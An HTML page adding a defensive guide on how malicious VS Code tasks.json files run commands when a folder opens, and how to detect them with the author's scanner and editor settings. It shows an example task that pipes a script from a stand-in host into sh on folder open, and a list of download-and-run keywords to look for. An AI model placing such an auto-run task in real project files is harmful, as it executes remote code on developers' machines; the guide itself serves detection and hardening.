@@ -1,0 +1,180 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>How to detect malicious VS Code tasks that run when a folder opens</title>
+<meta name="description" content="A .vscode/tasks.json task with runOn set to folderOpen runs a command as soon as you open a folder. How the attack works, how to spot it, and how to scan for it with am-i-hacked before opening a repository.">
+<meta name="author" content="Isaac Bell">
+<link rel="canonical" href="https://isaacbell.github.io/secure-devtools/guides/malicious-editor-config/">
+<link rel="stylesheet" href="../../assets/site.css">
+<link rel="alternate" type="text/plain" title="llms.txt" href="../../llms.txt">
+<meta name="color-scheme" content="dark">
+<meta name="theme-color" content="#15181d">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="secure-devtools">
+<meta property="og:title" content="How to detect malicious VS Code tasks that run when a folder opens">
+<meta property="og:description" content="A .vscode/tasks.json task with runOn set to folderOpen runs a command as soon as you open a folder. How the attack works, how to spot it, and how to scan for it with am-i-hacked before opening a repository.">
+<meta property="og:url" content="https://isaacbell.github.io/secure-devtools/guides/malicious-editor-config/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="How to detect malicious VS Code tasks that run when a folder opens">
+<meta name="twitter:description" content="A .vscode/tasks.json task with runOn set to folderOpen runs a command as soon as you open a folder. How the attack works, how to spot it, and how to scan for it with am-i-hacked before opening a repository.">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "TechArticle",
+  "@id": "https://isaacbell.github.io/secure-devtools/guides/malicious-editor-config/#article",
+  "headline": "How to detect malicious VS Code tasks that run when a folder opens",
+  "description": "A .vscode/tasks.json task with runOn set to folderOpen runs a command as soon as you open a folder. How the attack works, how to spot it, and how to scan for it with am-i-hacked before opening a repository.",
+  "url": "https://isaacbell.github.io/secure-devtools/guides/malicious-editor-config/",
+  "mainEntityOfPage": "https://isaacbell.github.io/secure-devtools/guides/malicious-editor-config/",
+  "inLanguage": "en",
+  "datePublished": "2026-10-07",
+  "dateModified": "2026-10-07",
+  "author": {
+    "@type": "Person",
+    "@id": "https://isaacbell.github.io/secure-devtools/#isaac-bell",
+    "name": "Isaac Bell",
+    "url": "https://isaacbell.io",
+    "sameAs": [
+      "https://github.com/IsaacBell"
+    ]
+  },
+  "publisher": {
+    "@id": "https://isaacbell.github.io/secure-devtools/#isaac-bell"
+  },
+  "isPartOf": {
+    "@type": "WebSite",
+    "@id": "https://isaacbell.github.io/secure-devtools/#website",
+    "name": "secure-devtools",
+    "url": "https://isaacbell.github.io/secure-devtools/"
+  },
+  "about": [
+    {
+      "@id": "https://isaacbell.github.io/secure-devtools/tools/am-i-hacked/#software"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position": 1,
+      "name": "Home",
+      "item": "https://isaacbell.github.io/secure-devtools/"
+    },
+    {
+      "@type": "ListItem",
+      "position": 2,
+      "name": "Guides",
+      "item": "https://isaacbell.github.io/secure-devtools/guides/"
+    },
+    {
+      "@type": "ListItem",
+      "position": 3,
+      "name": "How to detect malicious VS Code tasks that run when a folder opens",
+      "item": "https://isaacbell.github.io/secure-devtools/guides/malicious-editor-config/"
+    }
+  ]
+}
+</script>
+</head>
+<body>
+
+<a class="skip" href="#main">Skip to content</a>
+<header class="site-header">
+  <div class="wrap">
+    <a class="wordmark" href="../../">secure-devtools</a>
+    <nav class="site-nav" aria-label="Site">
+      <a href="../../tools/">Tools</a>
+      <a href="../../guides/">Guides</a>
+      <a href="../../skills/">Skills</a>
+      <a href="../../compare/">Compare</a>
+      <a href="../../security/">Trust</a>
+      <a href="https://github.com/IsaacBell/secure-devtools">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<main id="main">
+<div class="wrap"><nav class="crumbs" aria-label="Breadcrumb"><ol><li><a href="../../">Home</a></li><li><a href="../../guides/">Guides</a></li><li><span aria-current="page">How to detect malicious VS Code tasks that run when a folder opens</span></li></ol></nav></div>
+<article class="wrap article">
+  <header class="page-head">
+    <h1>How to detect malicious VS Code tasks that run when a folder opens</h1>
+    <p class="byline muted">By <a href="https://isaacbell.io">Isaac Bell</a> · Updated <time datetime="2026-10-07">7 October 2026</time> · Applies to am-i-hacked 2.0.1</p>
+  </header>
+  <div class="answer"><p>VS Code, and editors built on it such as Cursor, can run a task automatically when a folder opens if <code>.vscode/tasks.json</code> sets <code>"runOn": "folderOpen"</code>. A malicious repository uses this to run a download-and-execute command the moment you look at it. Before opening an unfamiliar folder, scan it with <code>npx am-i-hacked &lt;dir&gt;</code>, which flags editor auto-run tasks and download-and-run commands in editor config, and keep Workspace Trust turned on.</p></div>
+  <div class="prose">
+<h2 id="how">How the attack works</h2>
+<p>A task file in the repository defines a shell command and asks the editor to run it on folder open:</p>
+<pre class="block"><code>{
+  "version": "2.0.0",
+  "tasks": [
+    {
+      "label": "setup",
+      "type": "shell",
+      "command": "curl -fsSL https://example.test/setup.sh | sh",
+      "runOptions": { "runOn": "folderOpen" }
+    }
+  ]
+}</code></pre>
+<p>Real examples hide the command better: a long line pushed off screen with whitespace, a script saved under a font or image name, or a task that only runs a harmless-looking <code>node</code> file which does the work. The repository is often presented as a take-home coding test or a bug to fix, so that you open it.</p>
+
+<h2 id="spot">How to spot it</h2>
+<ul>
+  <li><code>.vscode/tasks.json</code> with <code>"runOn": "folderOpen"</code>.</li>
+  <li><code>.vscode/settings.json</code> that allows automatic tasks (<code>task.allowAutomaticTasks</code>) or points an extension setting at an executable inside the repository.</li>
+  <li>Any <code>curl</code>, <code>wget</code>, <code>powershell</code>, <code>base64</code> or <code>| sh</code> in editor config.</li>
+  <li>A task that runs a file whose name does not match its contents, such as a <code>.woff2</code> that is really a script.</li>
+</ul>
+
+<h2 id="scan">Scan before you open</h2>
+<pre class="block"><code>npx am-i-hacked path/to/repo</code></pre>
+<p>am-i-hacked reports an editor auto-run task and a download-and-run command in editor config as separate findings, with file and line, and exits <code>1</code>. It also flags executable payloads disguised as asset files. Real output from a folder holding the task above:</p>
+<pre class="block"><code>am-i-hacked: FAILED — 2 findings across 1 file
+
+  .vscode/tasks.json:7
+    "command": "curl -fsSL https://example.test/setup.sh | sh",
+    → Download-and-run command in editor config
+
+  .vscode/tasks.json:8
+    "runOptions": { "runOn": "folderOpen" }
+    → Editor auto-run task</code></pre>
+<p>For editor settings that point at an executable, secure-semgrep's AI rule set includes an <code>ide-settings-executable-path</code> check: <code>npx secure-semgrep .</code>.</p>
+
+<h2 id="harden">Harden the editor</h2>
+<ul>
+  <li>Keep Workspace Trust on, and open unfamiliar folders in Restricted Mode. Tasks do not run in Restricted Mode.</li>
+  <li>Set <code>task.allowAutomaticTasks</code> to <code>off</code> in your user settings, so no folder can turn automatic tasks back on.</li>
+  <li>Read <code>.vscode/</code>, <code>.idea/</code> and other editor folders with <code>cat</code> or <code>less</code> before you open the project.</li>
+</ul>
+
+<h2 id="found">If you already opened it</h2>
+<p>Assume the command ran. Preserve the folder, check the machine with <code>npx am-i-hacked --system</code> for login items, shell startup changes and running processes it may have left behind, and rotate credentials from a different, clean device. See <a href="../audit-developer-machine/">how to check a developer machine</a>.</p>
+  </div>
+  <aside class="related" aria-labelledby="related"><h2 id="related">Related</h2><ul><li><a href="../../guides/inspect-untrusted-repository/">How to safely inspect an untrusted repository</a></li><li><a href="../../guides/audit-developer-machine/">How to check whether a developer machine is compromised</a></li><li><a href="../../tools/am-i-hacked/">am-i-hacked reference</a></li></ul></aside>
+</article>
+</main>
+
+<footer class="site-footer">
+  <div class="wrap">
+    <p class="muted">MIT licensed. Plain shell, zero npm runtime dependencies. Built and maintained by <a href="https://isaacbell.io">Isaac Bell</a>.</p>
+    <nav class="footer-nav" aria-label="Project links">
+      <a href="../../guides/">Guides</a>
+      <a href="../../compare/">Compare</a>
+      <a href="../../security/">Security &amp; trust</a>
+      <a href="https://github.com/IsaacBell/secure-devtools">GitHub</a>
+      <a href="https://www.npmjs.com/package/am-i-hacked">npm</a>
+      <a href="../../llms.txt">llms.txt</a>
+      <a href="https://github.com/IsaacBell/secure-devtools/security/advisories/new">Report a security issue</a>
+      <a href="https://ko-fi.com/ibell">Sponsor</a>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
